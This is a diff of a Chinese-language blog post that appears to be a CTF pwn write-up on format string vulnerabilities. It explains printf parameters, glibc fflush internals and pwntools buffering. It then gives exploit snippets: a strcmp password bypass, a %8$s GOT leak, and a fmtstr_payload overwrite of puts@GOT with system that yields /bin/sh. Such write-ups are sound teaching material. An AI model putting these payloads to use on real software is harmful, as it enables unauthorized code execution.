@@ -16,7 +16,7 @@
     <meta name="description" content="" />
     
     <title>
-      重探fmt - Rin
+      格式化字符串漏洞学习 - Rin
     </title>
     <link rel="manifest" href="/manifest.json" />
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
@@ -139,7 +139,7 @@
         <article class="post-entry">
     <div class="header">
       
-      <div class="title">重探fmt</div>
+      <div class="title">格式化字符串漏洞学习</div>
       <div class="meta">
         <span class="item">
           <span class="iconfont icon-time-circle"></span>
@@ -160,8 +160,8 @@
 <p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
 <p>非常清晰地告诉我：我是垃圾。</p>
 <h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
-<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
+</code></pre>
 <ul>
 <li><p>parameter</p>
 <ul>
@@ -223,41 +223,41 @@
 <h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
 <p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
 <p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>
-<span class="token function">_IO_new_file_sync</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  _IO_ssize_t delta<span class="token punctuation">;</span>
-  <span class="token keyword">int</span> retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<pre><code class="c">int
+_IO_new_file_sync (_IO_FILE *fp)
+{
+  _IO_ssize_t delta;
+  int retval = 0;
 
-  <span class="token comment">/*    char* ptr = cur_ptr(); */</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">&gt;</span> fp<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span> 
-    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token comment">//end of file</span>
-  delta <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>delta <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">TODO</span></span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_in_backup</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span>
-	delta <span class="token operator">-=</span> <span class="token function">eGptr</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">Gbase</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
-      _IO_off64_t new_pos <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> delta<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">!=</span> <span class="token punctuation">(</span>_IO_off64_t<span class="token punctuation">)</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
-	fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">ESPIPE</span></span>
-      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ESPIPE<span class="token punctuation">)</span>
-	<span class="token punctuation">;</span> <span class="token comment">/* Ignore error from unseekable devices. */</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
-      <span class="token keyword">else</span>
-	retval <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
-    fp<span class="token operator">-&gt;</span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
-  <span class="token comment">/* FIXME: Cleanup - can this be shared? */</span>
-  <span class="token comment">/*    setg(base(), ptr, ptr); */</span>
-  <span class="token keyword">return</span> retval<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_sync<span class="token punctuation">,</span> _IO_file_sync<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+  /*    char* ptr = cur_ptr(); */
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+    if (_IO_do_flush(fp)) 
+    return EOF;//end of file
+  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
+  if (delta != 0)
+    {
+#ifdef TODO
+      if (_IO_in_backup (fp))
+    delta -= eGptr () - Gbase ();
+#endif
+      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
+      if (new_pos != (_IO_off64_t) EOF)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
+#ifdef ESPIPE
+      else if (errno == ESPIPE)
+    ; /* Ignore error from unseekable devices. */
+#endif
+      else
+    retval = EOF;
+    }
+  if (retval != EOF)
+    fp-&gt;_offset = _IO_pos_BAD;
+  /* FIXME: Cleanup - can this be shared? */
+  /*    setg(base(), ptr, ptr); */
+  return retval;
+}
+libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
+</code></pre>
 <p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
 <h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
 <p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
@@ -294,18 +294,17 @@
 <p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
 <p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
 <p>等问题解决了在再来调。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>
-name <span class="token operator">=</span> <span class="token string">""</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
-    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+<pre><code class="python">tmp = 'sysbdmin'
+name = ""
+for i in tmp:
+    name += chr(ord(i) - 1)
 
 
-<span class="token comment">## password</span>
-<span class="token keyword">def</span> <span class="token function">password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name (ftp.hacker.server:Rainism):'</span><span class="token punctuation">)</span>
-    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+## password
+def password():
+    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
+    sh.sendline(name)
+</code></pre>
 <p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
 <p>这样就有了代码中的公式。</p>
 <p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
@@ -313,27 +312,25 @@ name <span class="token operator">=</span> <span class="token string">""</span>
 <p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
 <p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
 <p>这里的偏移是8</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># get the addr of puts</span>
-puts_got <span class="token operator">=</span> pwn3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts got : '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
-put<span class="token punctuation">(</span><span class="token string">b'1111'</span><span class="token punctuation">,</span> <span class="token string">b'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
-puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'1111'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
+<pre><code class="python"># get the addr of puts
+puts_got = pwn3.got['puts']
+log.success('puts got : ' + hex(puts_got))
+put(b'1111', b'%8$s' + p32(puts_got))
+puts_addr = u32(get('1111')[:4])
+</code></pre>
 <p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
 <p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
 <p>然后接收信息，就是puts的got表。</p>
 <p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
 <p>下一个关键点是</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
-put<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'enter the file name you want to get:'</span><span class="token punctuation">)</span>
-<span class="token comment">##gdb.attach(sh)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
+put('/bin/sh;', payload)
+sh.recvuntil('ftp&gt;')
+sh.sendline('get')
+sh.recvuntil('enter the file name you want to get:')
+##gdb.attach(sh)
+sh.sendline('/bin/sh;') 
+</code></pre>
 <p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
 <p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
 <p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
@@ -359,7 +356,7 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
     </div>
     <div class="item right">
         
-          <a href="../../../08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/">main_arena与多线程</a>
+          <a href="../../13/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%8C%E5%A4%A9--%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"></a>
         
     </div>
   </div>
